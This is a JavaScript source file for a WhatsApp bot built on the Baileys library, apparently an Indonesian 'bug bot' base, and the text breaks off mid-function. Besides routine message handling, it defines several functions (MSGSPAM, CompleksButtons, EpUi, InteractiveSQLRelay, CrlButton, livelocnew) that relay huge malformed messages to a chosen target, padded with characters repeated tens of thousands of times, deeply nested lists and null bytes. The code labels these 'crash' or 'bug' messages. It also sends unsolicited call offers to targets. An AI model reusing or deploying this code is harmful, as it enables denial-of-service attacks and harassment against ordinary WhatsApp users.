/*
Cella Sakit Hati
t.me/cellasta
I Apologize To Tama Riyuchi  
Creator Base :
-Tama Ryuichi
Contact Creator :
-Telegram : @tamainfinity
-WhatsApp : 62882007138253
-Youtube : @tamainfinity
-Instagram : @ryc.riyu
-Tiktok : @tamaryuichi
Note :
-Please Don't Remove This Credits
*/
//CLEAR CONSOLE
console.clear();

//END
//SCANING CONTROL

require('../Control/Ctrl')
//END
//INSTALLING BAILEYS

const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
GroupSettingChange, 
WAGroupMetadata, 
emitGroupParticipantsUpdate, 
emitGroupUpdate, 
WAGroupInviteMessageGroupMetadata, 
GroupMetadata, 
Headers,
WA_DEFAULT_EPHEMERAL,
getAggregateVotesInPollMessage, 
generateWAMessageContent, 
areJidsSameUser, 
useMultiFileAuthState, 
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore, 
makeWaSocket,
makeInMemoryStore,
MediaType,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys");

//END
//EXPORTS BASIC MODULE

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const jimp = require("jimp")
const axios = require('axios')
const fsx = require('fs-extra')
const sharp = require('sharp')
const crypto = require('crypto')
const yts = require('yt-search')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const jsobfus = require('javascript-obfuscator');
const { VocalRemover } = require('../System/Data8');
const { ocrSpace } = require("ocr-space-api-wrapper");
const { JSDOM } = require('jsdom')
const { spawn, exec, execSync } = require('child_process')
//END
//MODULE MESSAGE + PREFIX

module.exports = Ryc = async (Ryc, m, chatUpdate, store) => {
    try {
        var body = (
            m.mtype === "conversation" ? m.message.conversation || "[Conversation]" :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption || "[Image]" :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption || "[Video]" :
            m.mtype === "audioMessage" ? m.message.audioMessage.caption || "[Audio]" :
            m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "[Sticker]" :
            m.mtype === "documentMessage" ? m.message.documentMessage.fileName || "[Document]" :
            m.mtype === "contactMessage" ? "[Contact]" :
            m.mtype === "locationMessage" ? m.message.locationMessage.name || "[Location]" :
            m.mtype === "liveLocationMessage" ? "[Live Location]" :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text || "[Extended Text]" :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId || "[Button Response]" :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId || "[List Response]" :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId || "[Template Button Reply]" :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson)?.id || "[Interactive Response]" :
            m.mtype === "pollCreationMessage" ? "[Poll Creation]" :
            m.mtype === "reactionMessage" ? m.message.reactionMessage.text || "[Reaction]" :
            m.mtype === "ephemeralMessage" ? "[Ephemeral]" :
            m.mtype === "viewOnceMessage" ? "[View Once]" :
            m.mtype === "productMessage" ? m.message.productMessage.product?.name || "[Product]" :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text || "[Message Context]" :
            "[Unknown Type]"
        );
        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
        body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                      : global.prefa ?? global.prefix
  
//END
//DATA TAMBAHAN + PELENGKAP
const { 
smsg, 
tanggal, 
getTime, 
isUrl, 
sleep, 
clockString, 
runtime, 
fetchJson, 
getBuffer, 
jsonformat, 
format, 
parseMention, 
getRandom, 
getGroupAdm, 
generateProfilePicture 
} = require('../System/Data1')

//END
//DATA USER + DATA MESSAGE

const Owner = JSON.parse(fs.readFileSync('./Access/Own.json'))
const Premium = JSON.parse(fs.readFileSync('./Access/Prem.json'))
const CMD = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const BotNum = await Ryc.decodeJid(Ryc.user.id)
const CreatorOnly = [BotNum, ...Owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const PremOnly = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;
const qtext = q = args.join(" ")
const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await Ryc.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : ''
const GroupAdm = m.isGroup ? await getGroupAdm(participants) : ''
const BotAdm = m.isGroup ? GroupAdm.includes(BotNum) : false
const Adm = m.isGroup ? GroupAdm.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta', // Zona waktu WIB
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});
const mime = (quoted.msg || quoted).mimetype || ''
const THM = "https://files.catbox.moe/e20f25.jpg"
const Xxx = "https://files.catbox.moe/e20f25.jpg"
const Jepeg = fs.readFileSync('./System/path/Ryc.jpg')
const tamaxs = require('../System/tamaxs')
const ryclol = fs.readFileSync('./System/path/nulllol.jpeg')

//END
//DATA TIKTOK SCRAPER

const { tiktok } = require('../System/Data5')

//END
//EXPORTS MODULE BRAT + STICKER

const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('../System/Data2')

//DATA ADDBOT / JADIBOT PAIRING

const {
	jadibot,
	stopbot,
	listbot
} = require('../Connection/jadibot')

//END
//SEETINGS STATUS BOT

if (!Ryc.public) {
if (!CreatorOnly) return
}

//END
//INFO NEW MESSAGE IN CONSOLE

if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Time : ${time} \n` +
      ` 💬 Message Received : ${m.mtype} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  }
}

//END
//AUTO RECORDING

let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
//Ryc.sendPresenceUpdate(jd, from) // HAPUS UNTUK MEMATIKAN
}

let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
//END
//FUNCTION LOADING

async function loading () {
var Floading = [
"",
"",
""
]
let { key } = await Ryc.sendMessage(from, {text: " "})
for (let i = 0; i < Floading.length; i++) {
await Ryc.sendMessage(from, {text: Floading[i], edit: key });
}
}

//END
//FILE RESIZE ( FAKE )

const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}

//END
//FUNCTION OBF

async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Me`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

const VcardQuoted = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? {
            remoteJid: "0@s.whatsapp.net"
        } : {})
    },
    "message": {
        "documentMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
            "mimetype": "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
            "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
            "fileLength": "974197419741",
            "pageCount": "974197419741",
            "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
            "fileName": "𝐀𝐩͛𝐢͢𝐧.𝐌𝐩͛͢𝟓𝄷",
            "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
            "directPath": '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
            "mediaKeyTimestamp": "1715880173",
            "contactVcard": true
        },
        "title": "Assalamualaikum" + "ꦾ".repeat(103000),
        "body": {
            "text": "Assalamualaikum" + "ꦾ".repeat(103000) + "@1".repeat(150000)
        },
        "nativeFlowMessage": {},
        "contextInfo": {
            "mentionedJid": ["1@newsletter"],
            "groupMentions": [{ "groupJid": "1@newsletter", "groupSubject": "Assalamualaikum" }]
        }
    },
    "contextInfo": {
        "mentionedJid": [m.chat],
        "externalAdReply": {
            "showAdAttribution": true,
            "title": "Assalamualaikum",
            "body": "Assalamualaikum",
            "mediaType": 3,
            "renderLargerThumbnail": true,
            "thumbnailUrl": "your-thumbnail-url-here",
            "sourceUrl": "https://www.instagram.com/coreinpin/",
        },
        "forwardedNewsletterMessageInfo": {
            "newsletterJid": "12036332170343299@newsletter",
            "serverMessageId": 1,
            "newsletterName": "Assalamualaikum",
        }
    },
    "expiryTimestamp": 0,
    "amount": {
        "value": "999999999",
        "offset": 999999999,
        "currencyCode": "CRASHCODE9741",
    },
    "background": {
        "id": "100",
        "fileLength": "928283",
        "width": 1000,
        "height": 1000,
        "mimetype": "application/vnd.ms-powerpoint",
        "placeholderArgb": 4278190080,
        "textArgb": 4294967295,
        "subtextArgb": 4278190080,
    }
}
async function livelocnew(isTarget, ptcp = false) {
let BoomText = "My Location, Come Here!!! @1" + "ꦾ".repeat(250000);

const messageContent = {
    ephemeralMessage: {
        message: {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 0,
                        caption: BoomText,
                        sequenceNumber: "",
                        jpegThumbnail: null
                    },
                    body: {
                        text: BoomText
                    },
                    nativeFlowMessage: {}, // If needed, specify more details here
                    contextInfo: {
                     contactVcard: true,
                        mentionedJid: [m.chat],
                        groupMentions: [
                            { 
                                groupJid: "@120363321780343299@g.us", 
                                groupSubject: "TAMARYUICHI" 
                            }
                        ]
                    }
                }
            }
        }
    }
};

// Generate the WA message based on the content
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject(messageContent), {
    userJid: m.chat, 
    quoted: QuotedGalaxy // Ensure this is defined or passed correctly
});

// Send the generated message
await Ryc.relayMessage(m.chat, etc.message, {
    participant: { jid: m.chat }, 
    messageId: etc.key.id
});
}
//END
//SEND CALL

async function sendOfferCall(isTarget) {
    try {
        await Ryc.offerCall(isTarget);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}

async function sendOfferVideoCall(isTarget) {
    try {
        await Ryc.offerCall(isTarget, { 
        video: true 
        });
        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
    }
}
//END
//BUTTON MESSAGE ( NOT WORK )
Ryc.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await Ryc.sendPresenceUpdate('composing', jid)
      return Ryc.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
   
//END
//THUMBNAIL LINK + QUOTED MESSAGE
const lol = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: ryclol,
      itemCount: "9741",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["13135550002@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
const ThumbUrl = "https://files.catbox.moe/e20f25.jpg"
const ewek = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": { "url": "https://files.catbox.moe/e20f25.jpg" },
					"itemCount": 9741,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `Command : ${command}`,
					"orderTitle": "𝐀𝐩͛𝐢͢𝐧.𝐌𝐩͛͢𝟓𝄷",
					"sellerJid": "6285727819741@s.whatsapp.net",
					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
					"totalAmount1000": "9741",
					"totalCurrencyCode": "IDR"
				}
			}
		}
		const xXxX = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": { "url": "https://files.catbox.moe/e20f25.jpg" },
					"itemCount": 2009,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `! #Crash Message# !`,
					"orderTitle": " TamaRyuichi",
					"sellerJid": "6285727819741@s.whatsapp.net",
					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
					"totalAmount1000": "2009",
					"totalCurrencyCode": "IDR"
				}
			}
		}

const ReplyRyc = (teks) => {
    return Ryc.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐀𝐩͛𝐢͢𝐧.𝐌𝐩͛͢𝟓𝄷 `,
                body: `𝐀𝐩͛𝐢͢𝐧.𝐌𝐩͛͢𝟓𝄷`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: "https://files.catbox.moe/e20f25.jpg",
                sourceUrl: `https://www.instagram.com/coreinpin/`
            }
        }
    }, { quoted: lol });
}

//END

 // ZAP IMG \\
const GetsuZo = fs.readFileSync(`./system/image/IvS/EsQl.jpg`)
const GetSuZo = fs.readFileSync(`./system/image/IvS/ViLoc.jpg`)

async function MSGSPAM(isTarget) {
    let Msg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: ["13135550002@s.whastapp.net"],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: isTarget,
              },
            },
            body: {
              text: "Assalamualaikum"  + "ꦾ".repeat(99999),
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await Ryc.relayMessage(isTarget, Msg, {
      participant: { jid: isTarget },
    })
  }

  async function CompleksButtons(isTarget) {
 {
      let sections = [];
      for (let i = 0; i < 9999; i++) {
        let deepNested = {
          title: `syntx_${i}`,
          highlight_label: `syntx_${i}`,
          rows: [
            {
              title: `syntx_${i}`,
              id: `syntx_${i}`,
              subrows: [
                {
                  title: `syntx_${i}`,
                  id: `syntx_${i}`,
                  subsubrows: [
                    {
                      title: `syntx_${i}`,
                      id: `syntx_${i}`,
                    },
                    {
                      title: `syntx_${i}`,
                      id: `syntx_${i}`,
                    },
                  ],
                },
                {
                  title: `syntx_${i}`,
                  id: `syntx_${i}`,
                },
              ],
            },
          ],
        };
        sections.push(deepNested);
      }
      let listMessage = {
        title: "Force_Overflow",
        sections: sections,
      };
      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
              businessMessageForwardInfo: {
              businessOwnerJid: isTarget,
              },
              dataSharingContext: {
              showMmDisclosure: true,
              },
              participant: "0@s.whatsapp.net",
              mentionedJid: ["13135550002@s.whatsapp.net"],
           quotedMessage: {
          buttonsMessage: {
          documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
          fileLength: "9999999999999",
          pageCount: 3567587327,
          mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
          fileName: "Assalamualaikum",
          fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
          directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1735456100",
          contactVcard: true,
           caption: "Assalamualaikum"
          },
           contentText: "Assalamualaikum",
            footerText: "Assalamualaikum",
             buttons: [
              {
               buttonId: "\u0000".repeat(9999),
                buttonText: {
                 displayText: "Assalamualaikum"
                  },
                  type: 1
                  }
                 ],
                headerType: 3
               },
               contactVcard: true
               },
              },
              body: {
                text: "Assalamualaikum" + "ꦽ".repeat(9999) + "\u0018".repeat(9999)
                   },
                     nativeFlowMessage: {
                         buttons: [
                                {
                                name: "single_select",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "payment_method",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "call_permission_request",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                voice_call: "call_galaxy",
                                },
                                {
                                name: "payment_method",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "form_message",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "wa_payment_learn_more",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "wa_payment_transaction_details",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "wa_payment_fbpin_reset",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "catalog_message",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "payment_info",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "review_order",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "send_location",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "payments_care_csat",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "view_product",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "payment_settings",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "address_message",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "automated_greeting_message_view_catalog",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "open_webview",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "message_with_link_status",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "payment_status",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "galaxy_costum",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "message_with_link_status",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "extensions_message_v2",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "landline_call",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "mpm",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "cta_copy",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "cta_url",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "review_and_pay",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "galaxy_message",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                name: "cta_call",
                                buttonParamsJson: "JSON.stringify(listMessage)",
                                }
                           ],
                      },
                  },
              },
          },
      };
      await Ryc.relayMessage(isTarget, message, {
        participant: { jid: isTarget },
    });
  }
return new Promise(resolve => setTimeout(resolve, 1000));
}

async function EpUi(isTarget, ptcp = true) {
            let msg = await generateWAMessageFromContent(isTarget, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "Assalamualaikum" + "ꦾ".repeat(9999),
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "Assalamualaikum" + "ꦾ".repeat(9999),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "Assalamualaikum" + "ꦾ".repeat(9999)
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "Assalamualaikum" + "ꦾ".repeat(9999)
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await Ryc.relayMessage(isTarget, msg.message, ptcp ? {
                participant: {
                    jid: isTarget
                }
            } : {});
            console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
        }

async function InteractiveSQLRelay(isTarget, KeyS, Amount, ptcp = true) {
            let msg = await generateWAMessageFromContent(isTarget, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "Assalamualaikum" + "ꦾ".repeat(99999),
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "Assalamualaikum" + "ꦾ".repeat(99999),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "zero"
                                    },
                                    {
                                        name: "galaxy_message",
                                        buttonParamsJson: `{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}`
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: `{}`
                                    },
                                ]
                            }
                        }
                    }
                }
            }, {
                userJid: isTarget,
                quoted: KeyS
            });
            await Ryc.relayMessage(isTarget, msg.message, ptcp ? {
                participant: {
                    jid: isTarget
                }
            } : {});                    
            console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
        };

async function CrlButton(isTarget) {
    const msg = generateWAMessageFromContent(
        isTarget,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: `\0`
                        },
                        carouselMessage: {
                            cards: [
                                {
                                    header: {
                                        ...(await prepareWAMessageMedia(
                                            { image: { url: "https://files.catbox.moe/n1nqsc.jpg" } }, 
                                            { upload: Kai.waUploadToServer }
                                        )),
                                        title: `\0`,
                                        gifPlayback: true,
                                        subtitle: '\0',
                                        hasMediaAttachment: true
                                    },
                                    body: {
                                        text: `Lu Kenal Dev Dracula Gak?` + "ꦾ".repeat(120000)
                                    },
                                    footer: {
                                        text: "\0"
                                    },
                                    nativeFlowMessage: {
                                        buttons: [
                                            {
                                                name: "single_select",
                                                buttonParamsJson: JSON.stringify({
                                                    title: "😂۞𝐓͢𝐚𝐦𝐚ܢ𝐎𝐯𝐞𝐫𝐅𝐥𝐨⃕𝐰⃟😂",
                                                    sections: []
                                                })
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(60000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`
                                            },
                                            {
                                                name: "call_permission_request",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "mpm",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: "{\"title\":\"🦠\",\"sections\":[{\"title\":\"🔥\",\"highlight_label\":\"💥\",\"rows\":[{\"header\":\"\",\"title\":\"💧\",\"id\":\"⚡\"},{\"header\":\"\",\"title\":\"💣\",\"id\":\"✨\"}]}]}"
                                            },
                                            {
                                                name: "quick_reply",
                                                buttonParamsJson: "{\"display_text\":\"Quick Crash Reply\",\"id\":\"📌\"}"
                                            },
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: "{\"display_text\":\"Developed\",\"url\":\"https://t.me/Whhwhahwha\",\"merchant_url\":\"https://t.mw/Whhwhahwha\"}"
                                            },
                                            {
                                                name: "cta_call",
                                                buttonParamsJson: "{\"display_text\":\"Call Us Null\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_copy",
